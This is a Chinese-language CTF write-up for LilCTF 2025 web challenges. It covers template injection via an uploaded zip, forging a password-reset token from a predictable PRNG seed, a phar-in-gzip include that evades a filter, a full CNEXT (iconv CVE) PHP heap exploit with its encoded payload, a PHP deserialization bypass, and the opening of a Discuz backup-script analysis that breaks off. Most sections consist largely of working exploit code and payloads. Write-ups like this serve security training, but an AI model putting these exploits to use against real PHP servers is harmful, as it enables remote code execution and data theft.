+++
date = '2025-08-18T18:53:55+08:00'
title = 'LilCTF-2025-Web-Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++


## ez_bottle

关键代码

```Python
@post('/upload')
def upload():
    zip_file = request.files.get('file')
    if not zip_file or not zip_file.filename.endswith('.zip'):
        return 'Invalid file. Please upload a ZIP file.'

    if len(zip_file.file.read()) > MAX_FILE_SIZE:
        return 'File size exceeds 1MB. Please upload a smaller ZIP file.'

    zip_file.file.seek(0)

    current_time = str(time.time())
    unique_string = zip_file.filename + current_time
    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()
    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)
    os.makedirs(extract_dir)

    zip_path = os.path.join(extract_dir, 'upload.zip')
    zip_file.save(zip_path)

    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            for file_info in z.infolist():
                if is_symlink(file_info):
                    return 'Symbolic links are not allowed.'

                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))
                if not is_safe_path(extract_dir, real_dest_path):
                    return 'Path traversal detected.'

            z.extractall(extract_dir)
    except zipfile.BadZipFile:
        return 'Invalid ZIP file.'

    files = os.listdir(extract_dir)
    files.remove('upload.zip')

    return template("文件列表: {{files}}\n访问: /view/{{md5}}/{{first_file}}",
                    files=", ".join(files), md5=md5_hash, first_file=files[0] if files else "nofile")

@route('/view/<md5>/<filename>')
def view_file(md5, filename):
    file_path = os.path.join(UPLOAD_DIR, md5, filename)
    if not os.path.exists(file_path):
        return "File not found."

    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    if contains_blacklist(content):
        return "you are hacker!!!nonono!!!"

    try:
        return template(content)
    except Exception as e:
        return f"Error rendering template: {str(e)}"
```

上传一个zip，他会解压并显示文件列表，并且可以查看文件内容

打 SimpleTemplate 模板渲染，直接把flag复制到静态目录

```Python
% import shutil;shutil.copy('/flag', 'static/flag')
% end
```

![img](../assets/1755430984556-24.png)

访问带有payload的文件，代码执行拿到flag

![img](../assets/1755430984425-1.png)



## Ekko_note

源码

```Python
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2066/07/05 19:20:29
@Author  :   Ekko exec inc. 某牛马程序员 
'''
import os
import time
import uuid
import requests

from functools import wraps
from datetime import datetime
from secrets import token_urlsafe
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask import Flask, render_template, redirect, url_for, request, flash, session

SERVER_START_TIME = time.time()

# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。
# 反正整个程序没有一个地方用到random库。应该没有什么问题。
import random
random.seed(SERVER_START_TIME)

admin_super_strong_password = token_urlsafe()
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(20), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(60), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    time_api = db.Column(db.String(200), default='https://api.uuni.cn//api/time')

class PasswordResetToken(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    token = db.Column(db.String(36), unique=True, nullable=False)
    used = db.Column(db.Boolean, default=False)

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6: byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

with app.app_context():
    db.create_all()
    if not User.query.filter_by(username='admin').first():
        admin = User(
            username='admin',
            email='admin@example.com',
            password=generate_password_hash(admin_super_strong_password),
            is_admin=True
        )
        db.session.add(admin)
        db.session.commit()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('请登录', 'danger')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('请登录', 'danger')
            return redirect(url_for('login'))
        user = User.query.get(session['user_id'])
        if not user.is_admin:
            flash('你不是admin', 'danger')
            return redirect(url_for('home'))
        return f(*args, **kwargs)
    return decorated_function

def check_time_api():
    user = User.query.get(session['user_id'])
    try:
        response = requests.get(user.time_api)
        data = response.json()
        datetime_str = data.get('date')
        if datetime_str:
            print(datetime_str)
            current_time = datetime.fromisoformat(datetime_str)
            return current_time.year >= 2066
    except Exception as e:
        return None
    return None
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/server_info')
@login_required
def server_info():
    return {
        'server_start_time': SERVER_START_TIME,
        'current_time': time.time()
    }
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')

        if password != confirm_password:
            flash('密码错误', 'danger')
            return redirect(url_for('register'))

        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('已经存在这个用户了', 'danger')
            return redirect(url_for('register'))

        existing_email = User.query.filter_by(email=email).first()
        if existing_email:
            flash('这个邮箱已经被注册了', 'danger')
            return redirect(url_for('register'))

        hashed_password = generate_password_hash(password)
        new_user = User(username=username, email=email, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()

        flash('注册成功，请登录', 'success')
        return redirect(url_for('login'))

    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            session['user_id'] = user.id
            session['username'] = user.username
            session['is_admin'] = user.is_admin
            flash('登陆成功，欢迎!', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('用户名或密码错误!', 'danger')
            return redirect(url_for('login'))

    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    session.clear()
    flash('成功登出', 'info')
    return redirect(url_for('home'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email')
        user = User.query.filter_by(email=email).first()
        if user:
            # 选哪个UUID版本好呢，好头疼 >_<
            # UUID v8吧，看起来版本比较新
            token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧
            reset_token = PasswordResetToken(user_id=user.id, token=token)
            db.session.add(reset_token)
            db.session.commit()
            # TODO：写一个SMTP服务把token发出去
            flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')
            return redirect(url_for('reset_password'))
        else:
            flash('没有找到该邮箱对应的注册账户', 'danger')
            return redirect(url_for('forgot_password'))

    return render_template('forgot_password.html')

@app.route('/reset_password', methods=['GET', 'POST'])
def reset_password():
    if request.method == 'POST':
        token = request.form.get('token')
        new_password = request.form.get('new_password')
        confirm_password = request.form.get('confirm_password')

        if new_password != confirm_password:
            flash('密码不匹配', 'danger')
            return redirect(url_for('reset_password'))

        reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first()
        if reset_token:
            user = User.query.get(reset_token.user_id)
            user.password = generate_password_hash(new_password)
            reset_token.used = True
            db.session.commit()
            flash('成功重置密码！请重新登录', 'success')
            return redirect(url_for('login'))
        else:
            flash('无效或过期的token', 'danger')
            return redirect(url_for('reset_password'))

    return render_template('reset_password.html')

@app.route('/execute_command', methods=['GET', 'POST'])
@login_required
def execute_command():
    result = check_time_api()
    if result is None:
        flash("API死了啦，都你害的啦。", "danger")
        return redirect(url_for('dashboard'))

    if not result:
        flash('2066年才完工哈，你可以穿越到2066年看看', 'danger')
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        command = request.form.get('command')
        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。
        return redirect(url_for('execute_command'))

    return render_template('execute_command.html')

@app.route('/admin/settings', methods=['GET', 'POST'])
@admin_required
def admin_settings():
    user = User.query.get(session['user_id'])
    
    if request.method == 'POST':
        new_api = request.form.get('time_api')
        user.time_api = new_api
        db.session.commit()
        flash('成功更新API！', 'success')
        return redirect(url_for('admin_settings'))

    return render_template('admin_settings.html', time_api=user.time_api)

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0")
```

一开始发现我的uuid没有uuid8，感觉是版本问题，刚好在出题人博客看到了uuidv8的实现，就直接拿来用了

![img](../assets/1755430984425-2.png)

```Python
def uuid8(a=None, b=None, c=None):
    """Generate a UUID from three custom blocks.

    * 'a' is the first 48-bit chunk of the UUID (octets 0-5);
    * 'b' is the mid 12-bit chunk (octets 6-7);
    * 'c' is the last 62-bit chunk (octets 8-15).

    When a value is not specified, a pseudo-random value is generated.
    """
    if a is None:
        a = random.getrandbits(48)
    if b is None:
        b = random.getrandbits(12)
    if c is None:
        c = random.getrandbits(62)

    int_uuid_8 = (a & 0xffff_ffff_ffff) << 80
    int_uuid_8 |= (b & 0xfff) << 64
    int_uuid_8 |= c & 0x3fff_ffff_ffff_ffff
    # Set version and variant flags
    int_uuid_8 |= (8 << 76)  # Version 8
    int_uuid_8 |= (0x02 << 62)  # Variant 10xx (RFC4122)

    return uuid.UUID(int=int_uuid_8)
```

在源码中token的生成是在a位置传入username，b，c为空，但是我们可以看到b，c处生成的是伪随机数，种子是固定的，是程序的启动时间，我们可以在/server_info拿到。接下来就是伪造token去改admin密码。

生成token

```Python
import random
import uuid

SERVER_START_TIME = 1755353838.0696628
random.seed(SERVER_START_TIME)

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6: byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

def uuid8(a=None, b=None, c=None):
    """Generate a UUID from three custom blocks.

    * 'a' is the first 48-bit chunk of the UUID (octets 0-5);
    * 'b' is the mid 12-bit chunk (octets 6-7);
    * 'c' is the last 62-bit chunk (octets 8-15).

    When a value is not specified, a pseudo-random value is generated.
    """
    if a is None:
        a = random.getrandbits(48)
    if b is None:
        b = random.getrandbits(12)
    if c is None:
        c = random.getrandbits(62)

    int_uuid_8 = (a & 0xffff_ffff_ffff) << 80
    int_uuid_8 |= (b & 0xfff) << 64
    int_uuid_8 |= c & 0x3fff_ffff_ffff_ffff
    # Set version and variant flags
    int_uuid_8 |= (8 << 76)  # Version 8
    int_uuid_8 |= (0x02 << 62)  # Variant 10xx (RFC4122)

    return uuid.UUID(int=int_uuid_8)

token = str(uuid8(a=padding("admin")))
print(token)
```

在远端也生成一下token

![img](../assets/1755430984425-3.png)

成功修改密码

![img](../assets/1755430984425-4.png)

/execute_command 会从设置的时间api获取时间

![img](../assets/1755430984426-5.png)

获取的时间大于2066年才可以命令执行

```Python
from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/")
def fake_time():
    return jsonify({
        "date": "2067-01-01T12:00:00"
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0' ,port=5006)
```

vps起个服务

命令执行没回显，flag写静态目录

![img](../assets/1755430984426-6.png)





## php_jail_is_my_cry

```Bash
if (isset($_GET['down'])){
    include '/tmp/' . basename($_GET['down']);
    exit;
}

// 上传文件
if (isset($_FILES['file'])) {
    $target_dir = "/tmp/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    $orig = $_FILES["file"]["tmp_name"];
    $ch = curl_init('file://'. $orig);
    
    // I hide a trick to bypass open_basedir, I'm sure you can find it.

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    if (stripos($data, '<?') === false && stripos($data, 'php') === false && stripos($data, 'halt') === false) {
        file_put_contents($target_file, $data);
    } else {
        echo "存在 `<?` 或者 `php` 或者 `halt` 恶意字符!";
        $data = null;
    }
}
```

这里可以文件上传，而且可以包含tmp目录下的文件，但是文件上传有waf，不能有``<?` 或者 `php` 或者 `halt``。这里还有个提示说藏了个绕过open_basedir的trick，后面会用到。

前面这个跟 DeadsecCTF2025 的一道web题很像，利用了include 的一个trick，我们可以将phar文件压缩后再include，php会根据不同类型的压缩包对其进行解压后再当成phar解析。利用这个，我们就可以绕过waf，文件包含代码执行了。

```Bash
<?php
$phar = new Phar('exploit.phar');
$phar->startBuffering();

$stub = <<< 'STUB'
<?php
    phpinfo();
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);

$phar->addFromString('test.txt', 'test');

$phar->stopBuffering();
?>
```

压缩成gz文件

![img](../assets/1755430984426-7.png)

成功执行

![img](../assets/1755430984426-8.png)

但是由于**disable_functions**和**disable_classes**写的很死，没办法直接命令执行。

后面留意到了iconv的版本，发现小于2.39，可以打cnext

![img](../assets/1755430984426-9.png)

打cnext首先得拿maps和libc，由于open_basedir，我们只能读/var/www/html和/tmp

![img](../assets/1755430984426-10.png)

但是绕过open_basedir的方法题目源码给出来了，所以先读个源码

```PHP
<?php
if (isset($_POST['url'])) {
    $url = $_POST['url'];
    $file_name = basename($url);
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    
    if ($data) {
        file_put_contents('/tmp/'.$file_name, $data);
        echo "文件已下载: <a href='?down=$file_name'>$file_name</a>";
    } else {
        echo "下载失败。";
    }
}

if (isset($_GET['down'])){
    include '/tmp/' . basename($_GET['down']);
    exit;
}

// 上传文件
if (isset($_FILES['file'])) {
    $target_dir = "/tmp/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    $orig = $_FILES["file"]["tmp_name"];
    $ch = curl_init('file://'. $orig);
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all"); // secret trick to bypass, omg why will i show it to you!
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    if (stripos($data, '<?') === false && stripos($data, 'php') === false && stripos($data, 'halt') === false) {
        file_put_contents($target_file, $data);
    } else {
        echo "存在 `<?` 或者 `php` 或者 `halt` 恶意字符!";
        $data = null;
    }
}
?>
```

利用这个方法把maps和libc写到web目录

maps

```PHP
<?php
$phar = new Phar('maps.phar');
$phar->startBuffering();

$stub = <<< 'STUB'
<?php
    $ch = curl_init('file:///proc/self/maps');
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    file_put_contents("/var/www/html/maps", $data);
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);

$phar->addFromString('test.txt', 'test');

$phar->stopBuffering();
?>
```

libc

```php
<?php
$phar = new Phar('libc.phar');
$phar->startBuffering();

$stub = <<< 'STUB'
<?php
    $ch = curl_init('file:///usr/lib/x86_64-linux-gnu/libc.so.6');
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    file_put_contents("/var/www/html/libc", $data);
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);

$phar->addFromString('test.txt', 'test');

$phar->stopBuffering();
?>
```

生成payload

```Python
import requests
import re
from ten import *
from pwn import *
from dataclasses import dataclass
from base64 import *
import zlib
from urllib.parse import quote

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

url = "http://challenge.xinshi.fun:40793"
command: str = "/readflag > /var/www/html/flag;"
sleep: int = 1
PAD: int = 20
pad: int = 20
info = {}
heap = 0

@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start

# 获取 /proc/self/maps
def get_maps():
    data = '/maps'
    r = requests.get(url+data).text
    return r

# 获取 libc
def download_file(get_file , local_path):
    data = '/libc'
    r = requests.get(url + data,stream=True)
    data = r.content
    open(local_path,'wb').write(data)
    # Path(local_path).write(data)

def get_regions():
    maps = get_maps()
    # maps = maps.decode()
    PATTERN = re.compile(
        r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
    )
    regions = []
    for region in table.split(maps, strip=True):
        if match := PATTERN.match(region):
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if "/" in path or "[" in path:
                path = path.rsplit(" ", 1)[-1]
            else:
                path = ""
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            print(maps)
            # failure("Unable to parse memory mappings")

    # self.log.info(f"Got {len(regions)} memory regions")

    return regions

# 通过 /proc/self/maps 得到 堆地址
def find_main_heap(regions: list[Region]) -> Region:
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == "rw-p"
        and region.size >= HEAP_SIZE
        and region.stop & (HEAP_SIZE - 1) == 0
        and region.path == ""
    ]

    if not heaps:
        failure("Unable to find PHP's main heap in memory")

    first = heaps[0]

    if len(heaps) > 1:
        heaps = ", ".join(map(hex, heaps))
        msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
    else:
        msg_info(f"Using [i]{hex(first)}[/] as heap")

    return first

def _get_region(regions: list[Region], *names: str) -> Region:
    """Returns the first region whose name matches one of the given names."""
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        failure("Unable to locate region")

    return region

# 下载 libc 文件
def get_symbols_and_addresses():
    regions = get_regions()
    LIBC_FILE = "/dev/shm/cnext-libc"

    # PHP's heap

    info["heap"] = heap or find_main_heap(regions)

    # Libc

    libc = _get_region(regions, "libc-", "libc.so")

    download_file(libc.path, LIBC_FILE)

    info["libc"] = ELF(LIBC_FILE, checksec=False)
    info["libc"].address = libc.start

def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]

def b64(data: bytes, misalign=True) -> bytes:
    payload = b64encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload

def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)

def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket

def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"

# 攻击 payload 的生成
def build_exploit_path() -> str:
    LIBC = info["libc"]
    ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
    ADDR_EFREE = LIBC.symbols["__libc_system"]
    ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

    ADDR_HEAP = info["heap"]
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b"\x00" * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b"\x00" * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

    step2_size = 0x48
    step2 = b"\x00" * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b"\x00" * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b"=00" + b"\x00" * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap->free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = command
    COMMAND = f"kill -9 $PPID; {COMMAND}"
    if sleep:
        COMMAND = f"sleep {sleep}; {COMMAND}"
    COMMAND = COMMAND.encode() + b"\x00"

    assert (
            len(COMMAND) <= step4_use_custom_heap_size
    ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * PAD
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f"data:text/plain;base64,{resource.decode()}"

    filters = [
        # Create buckets
        "zlib.inflate",
        "zlib.inflate",

        # Step 0: Setup heap
        "dechunk",
        "convert.iconv.latin1.latin1",

        # Step 1: Reverse FL order
        "dechunk",
        "convert.iconv.latin1.latin1",

        # Step 2: Put fake pointer and make FL order back to normal
        "dechunk",
        "convert.iconv.latin1.latin1",

        # Step 3: Trigger overflow
        "dechunk",
        "convert.iconv.UTF-8.ISO-2022-CN-EXT",

        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        "convert.quoted-printable-decode",
        "convert.iconv.latin1.latin1",
    ]
    filters = "|".join(filters)
    path = f"php://filter/read={filters}/resource={resource}"
    # print(path)
    return path

def exploit() -> None:
    path = build_exploit_path()
    start = time.time()
    print(path)

get_symbols_and_addresses()
print(info)
exploit()
```

![img](../assets/1755430984426-11.png)

一开始想着直接include打就行了，但是发现不行，在这里卡了很久。找了一圈看看有没有其他能打cnext的函数，太菜了没找到，所以又回到include了。

环境没开报错，所以本地开个环境看看怎么回事。可以看到由于allow_url_include为Off，所以include里面没办法使用data://

![img](../assets/1755430984426-12.png)

那这样就好办了，我们不用data://就好了，data在这个payload里面的作用是base64解码，那我们直接用php://filter解码不就好了。我们可以直接把base64的内容写到文件中，接着用php://filter读取并解码

最终Payload

```Bash
<?php
$phar = new Phar('exploit.phar');
$phar->startBuffering();

$stub = <<< 'STUB'
<?php
    file_put_contents("/tmp/base","e3vXsO+NiwDbg77XJm8l3/eoFzDYhCk95hLbst6xicNClfP7glt/ORo4MidWvHof/FL/+7r0Y/OyfF9FMTLgBTMObZIp3Hr76quIq9Fvtk7b6brJEb8GBrWNOu4xb8u2WoV9Fatem5o3MUcAv4YGT53TguG7Y9f2he49Gpc9M1pFmgW/jmVF8dt2RO2Nkl0d9Vv4QfXdV8+b+dev37ZX7/f20vtyv3/dmv/+/1V236DXU/ed51/lUSdHwMk/9ldfefE2Vzp3zTXdb+l35c//vbwtf31t7dvz3/dei4tPvfvd//v+/3vn//93/rPyz2n4g+xB/M7/FbYNf/49/srw6Td/8lfn3r+V9+Xvv+nfHnd+1/1XdfHffl//++Dj138Vsf//LtPPn//t92uriO/bb2XXvn396+eT27//7Yl9v/lNf2m9zTpxvb+Kz//a7v/7eY77/+R5N/vnz9ful7/970x47S6713/19c9/l+93CPf6u1XpZyUzgbg8timncGsVMGa2us28+X7/P5mT3wiETIJF/4kI46jXG11nuqh8Zh9VPKp4VDGdFc+4F5R9pmT36R23r2d4T/HYRqDEPvBlWlTystuxx+7uc4te5LKJl0AWX7b9ipTx3XdG776Z3hJSnZRLQLnB2qV5hVul4i+l7n/61O2nwP3p9+t+vlsepHSojIDOGdeCtu+I6tV/uel+1hR+McFtBIqrA1um7Tp6NavGc/rfsMU1Gzp+MAMA");
    include("php://filter/read=convert.base64-decode|zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=/tmp/base");
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);

$phar->addFromString('test.txt', 'test');

$phar->stopBuffering();
?>
```

拿到flag

![img](../assets/1755430984426-13.png)

## Your Uns3r

题目

```Bash
<?php
highlight_file(__FILE__);
class User
{
    public $username;
    public $value;
    public function exec()
    {
        $ser = unserialize(serialize(unserialize($this->value)));
        if ($ser != $this->value && $ser instanceof Access) {
            include($ser->getToken());
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}

class Access
{
    protected $prefix;
    protected $suffix;

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;

    }
}

$ser = $_POST["user"];
if (strpos($ser, 'admin') !== false && strpos($ser, 'Access":') !== false) {
    exit ("no way!!!!");
}

$user = unserialize($ser);
throw new Exception("nonono!!!");
```

EXP

```Bash
<?php
// highlight_file(__FILE__);
class User
{
    public $username;
    public $value;
}

class Access
{
    protected $prefix = 'php://filter/read=convert.base64-encode/resource=';
    protected $suffix = '/../../../../../flag';

}

$exp = new User();
$exp -> username = 'admin';
$access = new Access();
$exp -> value = serialize($access);

$exp = serialize($exp);
$exp = str_replace("s:5:\"admin","S:5:\"admi\\6e",$exp);
$exp = str_replace("Access","ACcess",$exp);

echo urlencode($exp);

//O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22admi%5C6e%22%3Bs%3A5%3A%22value%22%3Bs%3A134%3A%22O%3A6%3A%22ACcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A20%3A%22%2F..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B%7D
```

类名可以用大小写绕过，变量名可以用hex绕过

最后删除最后一个括号来绕过gc回收

Payload

```Python
user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22admi%5C6e%22%3Bs%3A5%3A%22value%22%3Bs%3A134%3A%22O%3A6%3A%22ACcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A20%3A%22%2F..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B
```

![img](../assets/1755430984426-14.png)

## 我曾有一份工作

扫目录扫到 /www.zip

拿到源码之后先用Seay扫一下可能存在风险的位置

想着先找前台洞，所以先找没有鉴权的

![image-20250817202005435](../assets/image-20250817202005435.png)

看到这个/uc_server/api/dbbak.php，想起来题目提到数据库和备份，感觉应该是找对了

这是一个数据库备份的脚本，可以对数据库进行导入导出之类的操作，题目说flag在`pre_a_flag` 表，那我们只需要把数据库导出来就好了，看看流程。

